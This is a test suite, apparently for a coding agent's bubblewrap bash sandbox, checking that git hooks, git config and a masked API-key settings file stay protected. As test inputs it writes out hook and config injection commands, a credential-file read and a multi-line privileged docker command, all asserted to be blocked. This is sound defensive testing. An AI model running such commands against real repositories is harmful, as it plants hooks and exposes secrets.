          const result = await sandboxedBash('echo "touch" > test.txt', repo);
          expect(result.status).not.toBe('success');
          expect(result.content).toContain(
            'symlink, and the sandbox cannot protect a symlinked control path',
          );
          expect(result.content).toContain(join(repo, 'gd'));
          expect(existsSync(join(repo, 'test.txt'))).toBe(false);
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('runs commands without bwrap abort when core.hooksPath is in .book and hooks dir is absent', async () => {
        const repo = freshRepo({ book: true });
        try {
          writeFileSync(join(repo, '.git', 'config'), '[core]\n\thooksPath = .book/hooks\n');
          expect(existsSync(join(repo, '.book', 'hooks'))).toBe(false);

          const result = await sandboxedBash('echo "success"', repo);
          expect(result.status).toBe('success');
          expect(result.content).toContain('success');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });
    });

    describe('allowWrite over a protected path', () => {
      it('lets a user write inside a protected path they asked for', async () => {
        // A hook installer that has to write `.git/hooks/pre-commit`, a cache
        // under `.book/cache`: the protected mounts used to be emitted after
        // every `allowWrite` bind, so the entry was silently overridden.
        const repo = freshRepo({ book: true });
        try {
          const result = await sandboxedBash(
            `printf 'installed\\n' > .git/hooks/post-commit`,
            repo,
            {
              filesystem: {
                allowWrite: [join(repo, '.git', 'hooks'), join(repo, '.book')],
              },
            },
          );

          expect(result.status).toBe('success');
          expect(readFileSync(join(repo, '.git', 'hooks', 'post-commit'), 'utf8')).toBe(
            'installed\n',
          );
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('does not let an entry above a protected path reopen it', async () => {
        const repo = freshRepo({ book: true });
        try {
          const result = await sandboxedBash(`printf 'pwned' > .book/settings.json`, repo, {
            filesystem: { allowWrite: [repo] },
          });

          expect(result.status).not.toBe('success');
          expect(readFileSync(join(repo, '.book', 'settings.json'), 'utf8')).toBe('{}\n');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      /**
       * The opt-in binds are emitted after the protected mounts, so an entry
       * naming `.book` put the directory — and the credential `settings.local.json`
       * holds — back in reach. A trusted `.book/settings.json` is the one thing a
       * user writes, so this is the entry a real user adds.
       */
      it('keeps the credential masked when an entry opens .book itself', async () => {
        const repo = freshRepo({ book: true });
        const local = join(repo, '.book', 'settings.local.json');
        writeFileSync(local, JSON.stringify({ provider: { apiKey: 'sk-secret' } }));
        try {
          const result = await sandboxedBash(`cat .book/settings.local.json || true`, repo, {
            filesystem: { allowWrite: [join(repo, '.book')] },
          });

          expect(result.status).toBe('success');
          expect(result.content).not.toContain('sk-secret');
          // The host still holds it: this is a mask inside the namespace.
          expect(readFileSync(local, 'utf8')).toContain('sk-secret');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('re-locks hooks and config under allowWrite: [<ws>/.git] while git commit succeeds', async () => {
        const repo = freshRepo();
        try {
          const hookRes = await sandboxedBash(`printf 'evil\\n' > .git/hooks/post-commit`, repo, {
            filesystem: { allowWrite: [join(repo, '.git')] },
          });
          expect(hookRes.status).not.toBe('success');

          const configRes = await sandboxedBash(`printf 'evil\\n' >> .git/config`, repo, {
            filesystem: { allowWrite: [join(repo, '.git')] },
          });
          expect(configRes.status).not.toBe('success');

          const commitRes = await sandboxedBash(
            `echo "change" >> file.txt && git add file.txt && git -c user.email=book@example.invalid -c user.name=book commit -m "sandboxed commit"`,
            repo,
            { filesystem: { allowWrite: [join(repo, '.git')] } },
          );
          expect(commitRes.status).toBe('success');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });

      it('allows writing hooks but not config under allowWrite: [<ws>/.git/hooks]', async () => {
        const repo = freshRepo();
        try {
          const hookRes = await sandboxedBash(`printf 'custom\\n' > .git/hooks/post-commit`, repo, {
            filesystem: { allowWrite: [join(repo, '.git', 'hooks')] },
          });
          expect(hookRes.status).toBe('success');
          expect(readFileSync(join(repo, '.git', 'hooks', 'post-commit'), 'utf8')).toBe('custom\n');

          const configRes = await sandboxedBash(`printf 'evil\\n' >> .git/config`, repo, {
            filesystem: { allowWrite: [join(repo, '.git', 'hooks')] },
          });
          expect(configRes.status).not.toBe('success');
        } finally {
          rmSync(repo, { recursive: true, force: true });
        }
      });
    });
  },
);

describe('matchesExcludedCommand', () => {
  it('matches a glob pattern against the whole command', () => {
    expect(matchesExcludedCommand('docker build .', ['docker *'])).toBe(true);
    expect(matchesExcludedCommand('git status', ['docker *'])).toBe(false);
  });

  it('matches against the whole command, not the first line getPrimaryArg would keep', () => {
    // The permission path and the execution path must judge the same text.
    // getPrimaryArg truncates a command to its first line, so a pattern that
    // only matches the full text would be missed by a first-line matcher and
    // the command would be judged sandboxed while Bash ran it unsandboxed.
    const command = 'echo hello\ndocker run --privileged evil';
    expect(matchesExcludedCommand(command, [command])).toBe(true);
    expect(matchesExcludedCommand(command.split('\n')[0], [command])).toBe(false);
  });

  it('treats a missing pattern list as no exclusions', () => {
    expect(matchesExcludedCommand('anything', [])).toBe(false);
    expect(matchesExcludedCommand('anything', undefined)).toBe(false);
  });
});

describe('sandboxCoverage', () => {
  const available = () => true;
  const unavailable = () => false;

  it('reports a genuinely sandboxed command', () => {
    expect(sandboxCoverage('ls', sandboxSettings(), available)).toEqual({ sandboxed: true });
  });

  it('reports "disabled" when sandboxing is off', () => {
    expect(sandboxCoverage('ls', sandboxSettings({ enabled: false }), available)).toEqual({
      sandboxed: false,
      reason: 'disabled',
    });
  });

  it('reports "excluded" for a command matching sandbox.excludedCommands', () => {
    const settings = sandboxSettings({ excludedCommands: ['docker *'] });
    expect(sandboxCoverage('docker ps', settings, available)).toEqual({
      sandboxed: false,
      reason: 'excluded',
    });
    expect(sandboxCoverage('ls', settings, available)).toEqual({ sandboxed: true });
  });

  it('reports "unavailable" when the bubblewrap backend is missing', () => {
    expect(sandboxCoverage('ls', sandboxSettings(), unavailable)).toEqual({
      sandboxed: false,
      reason: 'unavailable',
    });
  });

  it('prefers "disabled" over "unavailable" so the diagnosis is the actionable one', () => {
    expect(sandboxCoverage('ls', sandboxSettings({ enabled: false }), unavailable)).toEqual({
      sandboxed: false,
      reason: 'disabled',
    });
  });

  it('does not probe the backend when sandboxing is disabled or the command is excluded', () => {
    const probe = vi.fn(() => true);
    sandboxCoverage('ls', sandboxSettings({ enabled: false }), probe);
    sandboxCoverage('docker ps', sandboxSettings({ excludedCommands: ['docker *'] }), probe);
    expect(probe).not.toHaveBeenCalled();
  });
});

describe('realSandboxHost', () => {
  let dir: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'book-sbx-host-'));
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  /**
   * These files are read to decide what to protect, from a path the workspace
   * controls, on every sandboxed command. Read unguarded, a FIFO at `.git` or
   * `<gitdir>/commondir` blocks that read for ever — so every sandboxed command
   * after it hangs on the host — and `/dev/zero` never ends at all.
   */
  it('reads at most a few KB of a control file', () => {
    const big = join(dir, 'commondir');
    writeFileSync(big, 'x'.repeat(1024 * 1024));

    expect(realSandboxHost.readFile(big)).toHaveLength(4096);
  });

  it('reads a short control file whole', () => {
    const pointer = join(dir, 'commondir');
    writeFileSync(pointer, '../.git-shared\n');

    expect(realSandboxHost.readFile(pointer)).toBe('../.git-shared\n');
  });

  /**
   * The 4 KiB cap is right for a one-line pointer and wrong for a repository
   * config: a `hooksPath` declared past it was missed, and the hooks directory it
   * named stayed writable. The cap is per call so both sizes stay honest.
   */
  it('reads a git config up to the larger cap, and no further', () => {
    const config = join(dir, 'config');
    writeFileSync(config, 'x'.repeat(1024 * 1024));

    expect(realSandboxHost.readFile(config, 1024 * 1024)).toHaveLength(1024 * 1024);
    // The small cap still applies when a caller asks for it, so a pointer file
    // cannot be made to block on by being padded.
    expect(realSandboxHost.readFile(config)).toHaveLength(4096);
  });

  it('reports the size of a regular file and nothing else', () => {
    const file = join(dir, 'config');
    writeFileSync(file, 'x'.repeat(1234));
    const sub = join(dir, 'sub');
    mkdirSync(sub);
    const link = join(dir, 'link');
    symlinkSync(file, link);

    expect(realSandboxHost.fileSize(file)).toBe(1234);
    // A size is only meaningful for a file, and the kind is what decides: a
    // directory, a link and an absent path are all "no size to compare".
    expect(realSandboxHost.fileSize(sub)).toBeNull();
    expect(realSandboxHost.fileSize(link)).toBeNull();
    expect(realSandboxHost.fileSize(join(dir, 'absent'))).toBeNull();
  });

  it.skipIf(process.platform === 'win32')('never blocks on a FIFO and never reads a device', () => {
    // Both would hang here, which is the point: they return instead. `mkfifo`
    // is coreutils, so the fixture is made the way a workspace would make it.
    const fifo = join(dir, '.git');
    execFileSync('mkfifo', [fifo]);
    expect(realSandboxHost.readFile(fifo)).toBeNull();
    expect(realSandboxHost.readFile('/dev/zero')).toBeNull();
    expect(realSandboxHost.readFile('/dev/null')).toBeNull();
  });

  it('does not follow a symlink into one either', () => {
    const link = join(dir, '.git');
    symlinkSync('/dev/zero', link);

    // `lstat`, not `stat`: the link is not a regular file, whatever it names.
    expect(realSandboxHost.readFile(link)).toBeNull();
  });

  /**
   * A path can vanish between the probe that found it and the spawn that mounts
   * it. `statSync` throws for that, and a throw here aborts the whole bwrap
   * invocation — so a race would take out the command rather than skip a mount.
   */
  it('treats a path that is not there as absent rather than throwing', () => {
    const gone = join(dir, 'vanished');

    expect(() => realSandboxHost.isDirectory(gone)).not.toThrow();
    expect(realSandboxHost.isDirectory(gone)).toBe(false);
    expect(realSandboxHost.readFile(gone)).toBeNull();
    expect(realSandboxHost.readDir(gone)).toEqual([]);
    expect(realSandboxHost.entryKind(gone)).toBeNull();
    expect(realSandboxHost.linkTarget(gone)).toBeNull();
    expect(realSandboxHost.realpath(gone)).toBeNull();
  });

  it('tells a directory, a file and a link apart without following the link', () => {
    const sub = join(dir, 'sub');
    mkdirSync(sub);
    const file = join(dir, 'file');
    writeFileSync(file, 'x');
    const link = join(dir, 'link');
    symlinkSync(sub, link);

    expect(realSandboxHost.entryKind(sub)).toBe('directory');
    expect(realSandboxHost.entryKind(file)).toBe('file');
    expect(realSandboxHost.entryKind(link)).toBe('symlink');
    expect(realSandboxHost.linkTarget(link)).toBe(sub);
    expect(realSandboxHost.realpath(link)).toBe(realSandboxHost.realpath(sub));
    expect(realSandboxHost.readDir(dir).sort()).toEqual(['file', 'link', 'sub']);
  });
});

describe('withGitConfigReadOnlyNotice', () => {
  const CONFIG_ERROR = 'fatal: could not write config file .git/config: Read-only file system';
  const ABSOLUTE_INDEX_ERROR =
    "fatal: Unable to create '/tmp/x/.git/index.lock': Read-only file system";
  const RELATIVE_FETCH_ERROR = "error: cannot open '.git/FETCH_HEAD': Read-only file system";
  const OBJECT_DB_ERROR =
    'error: insufficient permission for adding an object to repository database .git/objects';
  const STALE_LOCK_ERROR = "fatal: Unable to create '/tmp/x/.git/index.lock': File exists";
  const NON_GIT_RO_ERROR = 'cannot write .book/settings.local.json: Read-only file system';

  describe('in opt-out mode (gitDirReadOnly false or undefined)', () => {
    it('adds the legacy note once for a sandboxed git that could not write the config', () => {
      const text = withGitConfigReadOnlyNotice(CONFIG_ERROR, CONFIG_ERROR, true, '', false);

      expect(text).toContain(CONFIG_ERROR);
      expect(text).toContain('.git/config is read-only inside the sandbox');
      expect(text).toMatch(/Run this command outside the sandbox/);
      expect(text.match(/read-only inside the sandbox/g)).toHaveLength(1);

      // Same with gitDirReadOnly undefined:
      const textUndef = withGitConfigReadOnlyNotice(CONFIG_ERROR, CONFIG_ERROR, true);
      expect(textUndef).toContain('.git/config is read-only inside the sandbox');
    });

    it('says nothing for an unsandboxed command, which has no read-only config', () => {
      expect(withGitConfigReadOnlyNotice(CONFIG_ERROR, CONFIG_ERROR, false, '', false)).toBe(
        CONFIG_ERROR,
      );
    });

    it('says nothing for a failure that was not about the config', () => {
      const other = 'npm ERR! code ELIFECYCLE';
      expect(withGitConfigReadOnlyNotice(other, other, true, '', false)).toBe(other);
      expect(withGitConfigReadOnlyNotice('', '', true, '', false)).toBe('');
    });

    it('says nothing for an index.lock read-only error in opt-out mode', () => {
      expect(
        withGitConfigReadOnlyNotice(ABSOLUTE_INDEX_ERROR, ABSOLUTE_INDEX_ERROR, true, '', false),
      ).toBe(ABSOLUTE_INDEX_ERROR);
    });

    it('says nothing for an object database error in opt-out mode', () => {
      expect(withGitConfigReadOnlyNotice(OBJECT_DB_ERROR, OBJECT_DB_ERROR, true, '', false)).toBe(
        OBJECT_DB_ERROR,
      );
    });

    it('matches on the captured output, not only on the text it is appended to', () => {
      const text = withGitConfigReadOnlyNotice(
        'check failed (exit 1)',
        CONFIG_ERROR,
        true,
        '',
        false,
      );
      expect(text).toContain('check failed (exit 1)');
      expect(text).toContain('.git/config is read-only inside the sandbox');
    });

    it('says nothing for git config --global, which writes a different file', () => {
      expect(
        withGitConfigReadOnlyNotice(
          CONFIG_ERROR,
          CONFIG_ERROR,
          true,
          'git config --global user.name x',
          false,
        ),
      ).toBe(CONFIG_ERROR);
      expect(
        withGitConfigReadOnlyNotice(
          CONFIG_ERROR,
          CONFIG_ERROR,
          true,
          'cd sub && git config --system core.x 1',
          false,
        ),
      ).toBe(CONFIG_ERROR);
    });
  });

  describe('in read-only mode (gitDirReadOnly true)', () => {
    it('adds the new note for an absolute path index.lock failure', () => {
      const text = withGitConfigReadOnlyNotice(
        ABSOLUTE_INDEX_ERROR,
        ABSOLUTE_INDEX_ERROR,
        true,
        'git commit -m msg',
        true,
      );

      expect(text).toContain(ABSOLUTE_INDEX_ERROR);
      expect(text).toContain("the repository's git directory is read-only inside the sandbox");
      expect(text).toContain('sandbox.filesystem.allowGitWrites is off');
      expect(text).toContain('sandbox.filesystem.allowGitWrites lets sandboxed git write again');
      expect(text.match(/read-only inside the sandbox/g)).toHaveLength(1);
    });

    it('adds the new note for a relative FETCH_HEAD failure', () => {
      const text = withGitConfigReadOnlyNotice(
        RELATIVE_FETCH_ERROR,
        RELATIVE_FETCH_ERROR,
        true,
        'git fetch',
        true,
      );

      expect(text).toContain(RELATIVE_FETCH_ERROR);
      expect(text).toContain("the repository's git directory is read-only inside the sandbox");
      expect(text).toContain('sandbox.filesystem.allowGitWrites is off');
    });

    it('adds the new note for an unable to create temporary file failure', () => {
      const HASH_OBJECT_ERROR = 'error: unable to create temporary file: Read-only file system';
      const text = withGitConfigReadOnlyNotice(
        HASH_OBJECT_ERROR,
        HASH_OBJECT_ERROR,
        true,
        'git hash-object -w a.txt',
        true,
      );

      expect(text).toContain(HASH_OBJECT_ERROR);
      expect(text).toContain("the repository's git directory is read-only inside the sandbox");
      expect(text).toContain('sandbox.filesystem.allowGitWrites is off');
    });

    it('does not add the note for an object database permission failure', () => {
      const text = withGitConfigReadOnlyNotice(
        OBJECT_DB_ERROR,
        OBJECT_DB_ERROR,
        true,
        'git add .',
        true,
      );

      expect(text).toBe(OBJECT_DB_ERROR);
    });

    it('adds the new note for a config file write failure', () => {
      const text = withGitConfigReadOnlyNotice(
        CONFIG_ERROR,
        CONFIG_ERROR,
        true,
        'git remote add origin https://example.test',
        true,
      );

      expect(text).toContain(CONFIG_ERROR);
      expect(text).toContain("the repository's git directory is read-only inside the sandbox");
      expect(text).toContain('sandbox.filesystem.allowGitWrites is off');
    });

    it('says nothing for a stale-lock failure that is not read-only', () => {
      expect(
        withGitConfigReadOnlyNotice(
          STALE_LOCK_ERROR,
          STALE_LOCK_ERROR,
          true,
          'git commit -m x',
          true,
        ),
      ).toBe(STALE_LOCK_ERROR);
    });

    it('says nothing for a non-git read-only failure', () => {
      expect(withGitConfigReadOnlyNotice(NON_GIT_RO_ERROR, NON_GIT_RO_ERROR, true, '', true)).toBe(
        NON_GIT_RO_ERROR,
      );
    });

    it('says nothing for an unsandboxed command in read-only mode', () => {
      expect(
        withGitConfigReadOnlyNotice(
          ABSOLUTE_INDEX_ERROR,
          ABSOLUTE_INDEX_ERROR,
          false,
          'git commit',
          true,
        ),
      ).toBe(ABSOLUTE_INDEX_ERROR);
    });

    it('says nothing for git config --global or --system in read-only mode', () => {
      expect(
        withGitConfigReadOnlyNotice(
          CONFIG_ERROR,
          CONFIG_ERROR,
          true,
          'git config --global user.name x',
          true,
        ),
      ).toBe(CONFIG_ERROR);
      expect(
        withGitConfigReadOnlyNotice(
          CONFIG_ERROR,
          CONFIG_ERROR,
          true,
          'git config --system core.x 1',
          true,
        ),
      ).toBe(CONFIG_ERROR);
    });

    it('matches on captured output when text is summary', () => {
      const text = withGitConfigReadOnlyNotice(
        'check failed (exit 1)',
        ABSOLUTE_INDEX_ERROR,
        true,
        'git commit',
        true,
      );
      expect(text).toContain('check failed (exit 1)');
      expect(text).toContain("the repository's git directory is read-only inside the sandbox");
    });
  });
});

describe('unsandboxedRefusalMessage', () => {
  it.each([
    ['disabled' as const, 'sandbox.enabled is false'],
    ['excluded' as const, 'sandbox.excludedCommands'],
  ])('names the setting, the reason and the way out for %s', (reason, expectedReason) => {
    const message = unsandboxedRefusalMessage(reason);
    expect(message).toContain('sandbox.allowUnsandboxedCommands');
    expect(message).toContain(expectedReason);
    // Actionable: it must say what to change, not only what failed.
    expect(message).toMatch(/set sandbox\.allowUnsandboxedCommands to true/);
    // And where such a setting takes effect, because a workspace layer is
    // ignored for this key and a user who edits the project's own settings to
    // "fix" a refusal stays refused (#373).
    expect(message).toContain('~/.book/settings.json');
    expect(message).toContain('--settings');
  });

  /**
   * A missing backend is fixed by installing bubblewrap. Naming a settings file
   * for it sent the user looking for `bwrap` in `~/.book/settings.json`, which is
   * not a key in the file.
   */
  it('tells an unavailable backend to install bubblewrap, not to edit settings', () => {
    const message = unsandboxedRefusalMessage('unavailable');

    expect(message).toContain('bubblewrap');
    expect(message).toMatch(/Install bubblewrap/);
    expect(message).not.toContain('~/.book/settings.json');
    expect(message).not.toContain('--settings');
  });
});

describe('sandboxPolicySummary', () => {
  const active = { sandboxActive: true, adjudicationConfigured: false };

  it('reports refusal when allowUnsandboxedCommands is false', () => {
    const summary = sandboxPolicySummary(
      sandboxSettings({ allowUnsandboxedCommands: false }),
      active,
    );
    expect(summary.unsandboxedCommands).toContain('refused');
    expect(summary.unsandboxedCommands).toContain('sandbox.allowUnsandboxedCommands=false');
  });

  it('reports auto-allow as inert when no sandbox is actually active', () => {
    const summary = sandboxPolicySummary(sandboxSettings({ enabled: false }), {
      ...active,
      sandboxActive: false,
    });
    expect(summary.autoAllowBash).toContain('inert');
  });

  it('reports auto-allow as on only when a sandbox is actually active', () => {
    expect(sandboxPolicySummary(sandboxSettings(), active).autoAllowBash).toContain('on for');
  });

  // The auto-allow only stands in for the *default* ask, so any configured
  // deny/ask rule makes it inert. Reporting "on" there would tell the user the
  // sandbox is skipping prompts that Book is in fact still raising.
  it('reports auto-allow as inert when deny/ask rules are configured', () => {
    const summary = sandboxPolicySummary(sandboxSettings(), {
      ...active,
      adjudicationConfigured: true,
    });
    expect(summary.autoAllowBash).toContain('inert');
    expect(summary.autoAllowBash).toContain('permissions.deny/ask');
  });

  it('reports auto-allow as off when the key is false, even with an active sandbox', () => {
    const summary = sandboxPolicySummary(
      sandboxSettings({ autoAllowBashIfSandboxed: false }),
      active,
    );
    expect(summary.autoAllowBash).toContain('off');
    expect(summary.autoAllowBash).toContain('sandbox.autoAllowBashIfSandboxed=false');
  });

  it('reports git directories as read-only by default', () => {
    const summary = sandboxPolicySummary(sandboxSettings(), active);
    expect(summary.gitDirectories).toBe('read-only (sandbox.filesystem.allowGitWrites=false)');
  });

  it('reports git directories as writable when allowGitWrites is true', () => {
    const summary = sandboxPolicySummary(
      sandboxSettings({ filesystem: { allowGitWrites: true } }),
      active,
    );
    expect(summary.gitDirectories).toBe(
      'writable; hooks, config and pointer files read-only (sandbox.filesystem.allowGitWrites=true)',
    );
  });
});

describe('createSandbox describe()', () => {
  it('describes read-only git directories by default', () => {
    const sandbox = createSandbox(sandboxSettings());
    if (sandbox) {
      expect(sandbox.describe()).toContain('git directories read-only');
    }
  });

  it('describes writable git directories when allowGitWrites is true', () => {
    const sandbox = createSandbox(sandboxSettings({ filesystem: { allowGitWrites: true } }));
    if (sandbox) {
      expect(sandbox.describe()).toContain(
        'git directories writable (hooks, config and pointer files read-only)',
      );
    }
  });
});
